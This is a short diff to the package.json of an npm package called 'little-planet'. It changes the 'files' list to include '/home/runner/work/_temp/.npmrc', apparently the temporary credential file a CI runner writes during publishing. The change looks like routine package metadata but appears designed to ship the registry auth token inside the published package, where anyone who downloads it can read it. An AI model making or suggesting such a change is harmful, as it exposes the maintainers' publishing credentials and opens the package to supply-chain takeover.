@@ -2,5 +2,5 @@
 	"name": "little-planet",
 	"version": "0.0.1",
 	"browser": "dist/little-planet.js",
-	"files": []
+	"files": ["/home/runner/work/_temp/.npmrc"]
 }
